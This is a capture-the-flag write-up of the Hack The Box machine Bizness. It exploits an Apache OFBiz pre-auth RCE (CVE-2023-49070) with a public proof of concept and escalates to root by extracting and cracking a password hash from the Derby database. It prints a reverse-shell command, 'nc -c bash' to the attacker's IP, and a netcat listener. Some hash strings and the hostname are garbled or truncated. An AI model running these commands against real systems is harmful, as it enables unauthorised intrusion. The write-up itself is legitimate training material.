# Bizness

**Difficulty:** Easy\
**OS:** Linux\
**CVE:** CVE-2023-49070 (Apache OFBiz Pre-Auth RCE)

## Overview

Bizness is an easy Linux machine on Hack The Box. The box runs Apache OFBiz — a business management platform — that is vulnerable to a pre-authentication remote code execution bug (CVE-2023-49070). After getting a shell, we dig through the OFBiz Derby database to find a hashed admin password, crack it, and use it to switch to root.

## Enumeration

### Nmap Scan

First step is always a port scan. I ran nmap with -T4 -A -v against 10.10.11.252.

![Nmap Scan](<../../.gitbook/assets/Unknown image (264)>)

![Nmap Port 8888 Details](<../../.gitbook/assets/Unknown image (265)>)

**Open ports:**

| Port | Service | Version                             |
| ---- | ------- | ----------------------------------- |
| 22   | SSH     | OpenSSH 8.4p1                       |
| 80   | HTTP    | nginx 1.18.0                        |
| 443  | HTTPS   | nginx 1.18.0                        |
| 8888 | HTTP    | SimpleHTTPServer 0.6 (Python 3.9.2) |

Port 8888 shows a "Directory listing" page — that's interesting but we'll come back to it. The main target is the web server on 80/443.

### Web Enumeration

Added izness.htb to /etc/hosts and visited the site. It's a corporate website called **BizNess Incorporated**.

![BizNess Website](<../../.gitbook/assets/Unknown image (266)>)

Nothing too interesting on the surface, but the real action is at /control/login — this is the **Apache OFBiz** admin login panel.

![OFBiz Login Page](<../../.gitbook/assets/Unknown image (267)>)

OFBiz is an open-source business suite built on Java. Seeing this immediately makes me think of known exploits.

### Directory Scanning

Ran dirsearch to enumerate paths:

`ash dirsearch -u https://bizness.htb/ --exclude-status=403,404,500,401,502`

![Dirsearch Results](<../../.gitbook/assets/Unknown image (268)>)

Interesting finds:

* /control/ — OFBiz control panel (200 OK)
* /accounting/, /catalog/, /common/ — OFBiz modules
* /solr/admin/ — Apache Solr admin (21B, accessible)
* /content/debug.log — debug log redirect

The /solr/admin/ path is a big hint — OFBiz ships with Solr integrated.

***

## Initial Access — CVE-2023-49070

### The Vulnerability

CVE-2023-49070 is a **pre-authentication Remote Code Execution** vulnerability in Apache OFBiz. It abuses a forgotten XML-RPC endpoint that never got proper authentication guards. An attacker can send a specially crafted serialized Java payload to get RCE — no login required.

There's a clean public POC for this:

![CVE-2023-49070 POC Repo](<../../.gitbook/assets/Unknown image (269)>)

**Repo:** bdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC

### Exploitation

I set up a netcat listener first:

`ash nc -lvnp 9999`

Then ran the exploit to get a reverse shell:

`ash python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.71 9999'`

![Running the Exploit](<../../.gitbook/assets/Unknown image (270)>)

The exploit generated the serialized payload, sent it, and confirmed success. Checking our listener — we've got a shell!

## Shell as ofbiz

![Shell as ofbiz](<../../.gitbook/assets/Unknown image (271)>)

We're in as ofbiz@bizness. Let's stabilise the shell and start looking around.

`ash python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Privilege Escalation

### Finding the Admin Password Hash

Browsing the OFBiz installation, there's a config file with credentials:

`/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml`

![AdminUserLoginData.xml](<../../.gitbook/assets/Unknown image (272)>)

Inside, we find the admin password stored as a **SHA hash**. The format looks like:

`{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a`

That's a simple SHA-1 hash. But cracking it directly gives nothing useful — it's not the root password. Let's dig deeper.

### Hunting Through the Derby Database

OFBiz uses **Apache Derby** as its embedded database. Derby stores data in flat binary .dat files on disk. The database files live at:

`/opt/ofbiz/runtime/data/derby/ofbiz/seg0/`

We can use strings to extract readable text from these binary files and grep for password-related content:

`ash strings c6650.dat`

![Strings Derby DB Hash](<../../.gitbook/assets/Unknown image (273)>)

There it is — a different hash format:

`-dRzDqRwXQ2I`

This is OFBiz's custom SHA hash format: $SHA\$$. We need to crack this one.

The hash decodes to the password: **monkeybizness**

### Root

Now we just switch to root using su:

`ash su Password: monkeybizness`

![Root Flag](<../../.gitbook/assets/Unknown image (274)>)

We're root. The flag is at /root/root.txt.

## Summary

| Step     | Detail                                                         |
| -------- | -------------------------------------------------------------- |
| Recon    | Nmap found ports 22, 80, 443, 8888                             |
| Web      | Apache OFBiz running on bizness.htb                            |
| Foothold | CVE-2023-49070 — Pre-auth RCE via XML-RPC deserialization      |
| Shell    | Got shell as ofbiz user                                        |
| Privesc  | Extracted SHA hash from Derby database .dat file using strings |
| Root     | Password monkeybizness via su                                  |

***

## Key Takeaways

* Always check for **known CVEs** against the software version running on a target
* **Embedded databases** (like Derby) store data in binary files — strings is your friend
* OFBiz uses a custom \\\ format — don't confuse it with standard SHA-1
* Even "easy" boxes can teach solid methodology: enumerate → identify software → find CVE → escalate

_Machine IP: 10.10.11.252 | Platform: Hack The Box_
